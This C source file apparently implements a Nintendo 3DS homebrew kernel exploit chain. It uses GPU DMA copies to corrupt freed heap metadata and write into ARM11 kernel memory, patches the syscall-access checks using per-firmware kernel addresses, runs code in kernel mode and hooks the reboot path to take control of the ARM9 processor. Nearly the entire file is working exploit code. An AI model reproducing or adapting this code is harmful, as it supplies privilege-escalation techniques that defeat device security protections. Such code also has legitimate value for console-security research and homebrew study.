#include <3ds.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <malloc.h>
#include <dirent.h>

u32 nop_slide[0x1000] __attribute__((aligned(0x1000)));
unsigned int patch_addr;
unsigned int svc_patch_addr;
unsigned char patched_svc = 0;
unsigned int kversion;
u8 isN3DS = 0;
u32 *backup;
unsigned int *arm11_buffer;

//Uncomment to have progress printed w/ printf
#define DEBUG_PROCESS

void sub_20CC(void){
	__asm__ ("LDR R1, =0xFFFCC48C\t\n"
	  		  "1:\t\n"
	           "LDRH R2, [R1,#4]\t\n"
	           "TST R2, #2\t\n"
	           "BNE 1b\t\n"
	           "STR R0, [R1,#8]\t\n"
	           "BX LR");
}

void sub_20E4(void){
	__asm__ ("LDR R0, =0xFFFCC48C\t\n"
	  		   "LDRB R1, [R0,#3]\t\n"
	           "ORR R1, R1, #0x40\t\n"
	           "STRB R1, [R0,#3]\t\n"
	           "BX LR");
}

void sub_20F8(void){
	__asm__ ("LDR R0, =0xFFFCC48C\t\n"
	  		  "2:\t\n"
	           "LDRH R1, [R0,#4]\t\n"
	           "TST R1, #0x100\t\n"
	           "BNE 2b\t\n"
	           "LDR R0, [R0,#0xC]\t\n"
	           "BX LR");
}

int do_gshax_copy(void *dst, void *src, unsigned int len)
{
	unsigned int check_mem = linearMemAlign(0x10000, 0x40);
	int i = 0;

	// Sometimes I don't know the actual value to check (when copying from unknown memory)
	// so instead of using check_mem/check_off, just loop "enough" times.
	for (i = 0; i < 5; ++i) {
		GSPGPU_FlushDataCache (NULL, src, len);
		GX_SetTextureCopy(NULL, src, 0, dst, 0, len, 8);
		GSPGPU_FlushDataCache (NULL, check_mem, 16);
		GX_SetTextureCopy(NULL, src, 0, check_mem, 0, 0x40, 8);
	}

	linearFree(check_mem);

	return 0;
}

void dump_bytes(void *dst) {
	printf("DUMPING %p\n", dst);
	do_gshax_copy(arm11_buffer, dst, 0x20u);

	printf(" 0: %08X  4: %08X  8: %08X\n12: %08X 16: %08X 20: %08X\n",
			arm11_buffer[0], arm11_buffer[1], arm11_buffer[2],
			arm11_buffer[3], arm11_buffer[4], arm11_buffer[5]);
}

int get_version_specific_addresses()
{
	// get proper patch address for our kernel -- thanks yifanlu once again
	kversion = *(unsigned int *)0x1FF80000; // KERNEL_VERSION register
	patch_addr = 0;
	svc_patch_addr = 0;
	APT_CheckNew3DS(NULL, &isN3DS);

	if(!isN3DS || kversion < 0x022C0600)
	{
		if (kversion == 0x02220000) // 2.34-0 4.1.0
		{
			patch_addr = 0xEFF83C97;
			svc_patch_addr = 0xEFF827CC;
		}
		else if (kversion == 0x02230600) // 2.35-6 5.0.0
		{
			patch_addr = 0xEFF8372F;
			svc_patch_addr = 0xEFF822A8;
		}
		else if (kversion == 0x02240000 || kversion == 0x02250000 || kversion == 0x02260000) // 2.36-0 5.1.0, 2.37-0 6.0.0, 2.38-0 6.1.0
		{
			patch_addr = 0xEFF8372B;
			svc_patch_addr = 0xEFF822A4;
		}
		else if (kversion == 0x02270400) // 2.39-4 7.0.0
		{
			patch_addr = 0xEFF8372F;
			svc_patch_addr = 0xEFF822A8;
		}
		else if (kversion == 0x02280000) // 2.40-0 7.2.0
		{
			patch_addr = 0xEFF8372B;
			svc_patch_addr = 0xEFF822A4;
		}
		else if (kversion == 0x022C0600) // 2.44-6 8.0.0
		{
			patch_addr = 0xDFF83767;
			svc_patch_addr = 0xDFF82294;
		}
		else if (kversion == 0x022E0000) // 2.26-0 9.0.0
		{
			patch_addr = 0xDFF83837;
			svc_patch_addr = 0xDFF82290;
		}
		else
		{
#ifdef DEBUG_PROCESS
			printf("Unrecognized kernel version %x, returning...\n", kversion);
#endif
			return 0;
		}
	}
	else
	{
		if (kversion == 0x022C0600 || kversion == 0x022E0000) // N3DS 2.44-6 8.0.0, N3DS 2.26-0 9.0.0
		{
			patch_addr = 0xDFF8382F;
			svc_patch_addr = 0xDFF82260;
		}
		else
		{
#ifdef DEBUG_PROCESS
			printf("Unrecognized kernel version %x, returning... %i\n", kversion);
#endif
			return 0;
		}
	}

#ifdef DEBUG_PROCESS
	printf("createThread Addr: %x\nSVC Addr:          %x\n", patch_addr, svc_patch_addr);
#endif
	return 1;
}

int arm11_kernel_exploit_setup(void)
{
	unsigned int *test;
	int i;
	int (*nop_func)(void);
	int *ipc_buf;
	int model;

	get_version_specific_addresses();
#ifdef DEBUG_PROCESS
	printf("Loaded adr %x for kernel %x\n", patch_addr, kversion); 
#endif

	// part 1: corrupt kernel memory
	u32 tmp_addr;

	unsigned int mem_hax_mem;
	svcControlMemory(&mem_hax_mem, 0, 0, 0x2000, MEMOP_ALLOC_LINEAR, 0x3);
	unsigned int mem_hax_mem_free = mem_hax_mem + 0x1000;

	printf("Freeing memory\n");
	svcControlMemory(&tmp_addr, mem_hax_mem_free, 0, 0x1000, MEMOP_FREE, 0); // free page 

	printf("Backing up heap area\n");
	do_gshax_copy(arm11_buffer, mem_hax_mem_free, 0x20u);

	u32 saved_heap[8];
	memcpy(saved_heap, arm11_buffer, sizeof(saved_heap));

	arm11_buffer[0] = 1;
	arm11_buffer[1] = patch_addr;
	arm11_buffer[2] = 0;
	arm11_buffer[3] = 0;

	// overwrite free pointer
#ifdef DEBUG_PROCESS
	printf("Overwriting free pointer %x\n", mem_hax_mem);
#endif

	//Trigger write to kernel
	do_gshax_copy(mem_hax_mem_free, arm11_buffer, 0x10u);
	svcControlMemory(&tmp_addr, mem_hax_mem, 0, 0x1000, MEMOP_FREE, 0);

#ifdef DEBUG_PROCESS
	printf("Triggered kernel write\n");
	gfxFlushBuffers();
	gfxSwapBuffers();
#endif

	memcpy(arm11_buffer, saved_heap, sizeof(saved_heap));
	printf("Restoring heap\n");
	do_gshax_copy(mem_hax_mem, arm11_buffer, 0x20u);

	 // part 2: trick to clear icache
	for (i = 0; i < 0x1000; i++)
	{
		arm11_buffer[i] = 0xE1A00000; // ARM NOP instruction
	}
	arm11_buffer[i-1] = 0xE12FFF1E; // ARM BX LR instruction
	nop_func = nop_slide;

	do_gshax_copy(nop_slide, arm11_buffer, 0x10000);

	HB_FlushInvalidateCache();
	nop_func();

#ifdef DEBUG_PROCESS
	printf("Exited nop slide\n");
	gfxFlushBuffers();
	gfxSwapBuffers();
#endif

	get_version_specific_addresses();

	return 1;
}

// after running setup, run this to execute func in ARM11 kernel mode
int __attribute__((naked))
arm11_kernel_exploit_exec (int (*func)(void))
{
	__asm__ ("svc 8\t\n" // CreateThread syscall, corrupted, args not needed
			 "bx lr\t\n");
}

int __attribute__((naked))
arm11_kernel_execute(int (*func)(void))
{
	__asm__ ("svc #0x7B\t\n"
			 "bx lr\t\n");
}

void sub_1E8C(void){
	__asm__ ("ADD R2, R1, R2\t\n"
	  		  "17:\t\n"
	           "LDMIA R1!, {R3}\t\n"
	           "STMIA R0!, {R3}\t\n"
	           "CMP R1, R2\t\n"
	           "BCC 17b\t\n"
	           "BX LR");
}

void doArm9Hax(void)
{
#ifdef DEBUG_PROCESS
	printf("Setting up Arm9\n");
#endif

	int (*reboot)(int, int, int, int) = 0xFFF748C4;

	__asm__ ("clrex");

	CleanEntireDataCache();
	InvalidateEntireInstructionCache();

	// ARM9 code copied to FCRAM 0x23F00000
	//memcpy(0xF3F00000, ARM9_PAYLOAD, ARM9_PAYLOAD_LEN);
	// write function hook at 0xFFFF0C80
	//memcpy(0xEFFF4C80, 0x9D23AC, 0x9D2580);

	// write FW specific offsets to copied code buffer
	*(int *)(0xEFFF4C80 + 0x60) = 0xFFFD0000; // PDN regs
	*(int *)(0xEFFF4C80 + 0x64) = 0xFFFD2000; // PXI regs
	*(int *)(0xEFFF4C80 + 0x68) = 0xFFF84DDC; // where to return to from hook

	// patch function 0xFFF84D90 to jump to our hook
	*(int *)(0xFFF84DD4 + 0) = 0xE51FF004; // ldr pc, [pc, #-4]
	*(int *)(0xFFF84DD4 + 4) = 0xFFFF0C80; // jump_table + 0
	// patch reboot start function to jump to our hook
	*(int *)(0xFFFF097C + 0) = 0xE51FF004; // ldr pc, [pc, #-4]
	*(int *)(0xFFFF097C + 4) = 0x8F028C4; // jump_table + 4

	InvalidateEntireInstructionCache();

	printf("test1\n");

	reboot(0, 0, 2, 0); // trigger reboot
}

void test(void)
{
	arm11_buffer[0] = 0xFEEFF00F;
}

arm11_kernel_exec (void)
{
	arm11_buffer[0] = 0xF00FF00F;

	// fix up memory
	*(int *)(patch_addr+8) = 0x8DD00CE5;

	// give us access to all SVCs (including 0x7B, so we can return to kernel mode) 
	if(svc_patch_addr > 0)
	{
		*(int *)(svc_patch_addr) = 0xE320F000; //NOP
		*(int *)(svc_patch_addr+8) = 0xE320F000; //NOP
		patched_svc = 1;
	}
	InvalidateEntireInstructionCache();
	CleanEntireDataCache();

	return 0;
}

int __attribute__((naked))
arm11_kernel_stub (void)
{
	__asm__ ("add sp, sp, #8\t\n");

	arm11_kernel_exec ();

	__asm__ ("movs r0, #0\t\n"
			 "ldr pc, [sp], #4\t\n");
}

int doARM11Hax()
{
	int result = 0;
	int i;
	int (*nop_func)(void);
	HB_ReprotectMemory(nop_slide, 4, 7, &result);

	for (i = 0; i < 0x1000; i++)
	{
		nop_slide[i] = 0xE1A00000; // ARM NOP instruction
	}
	nop_slide[i-1] = 0xE12FFF1E; // ARM BX LR instruction
	nop_func = nop_slide;
	HB_FlushInvalidateCache();

#ifdef DEBUG_PROCESS
	printf("Testing nop slide\n");
#endif

	nop_func();

#ifdef DEBUG_PROCESS
	printf("Exited nop slide\n");
#endif

	unsigned int addr;
	void *this = 0x08F10000;
	int *written = 0x08F01000;
	arm11_buffer = linearMemAlign(0x10000, 0x10000);

	// wipe memory for debugging purposes
	for (i = 0; i < 0x1000/4; i++)
	{
		arm11_buffer[i] = 0xdeadbeef;
	}

	if(arm11_kernel_exploit_setup())
	{
#ifdef DEBUG_PROCESS
		printf("Kernel exploit set up, \nExecuting code under ARM11 Kernel...\n");
#endif

		arm11_kernel_exploit_exec (arm11_kernel_stub);
		//if(patched_svc > 0)
		{
#ifdef DEBUG_PROCESS
			printf("Testing SVC 0x7B\n");
#endif
			arm11_kernel_execute (test);

			doArm9Hax();

#ifdef DEBUG_PROCESS
			printf("Arm9 setup\n");
#endif
		}

	}

	return 0;
}
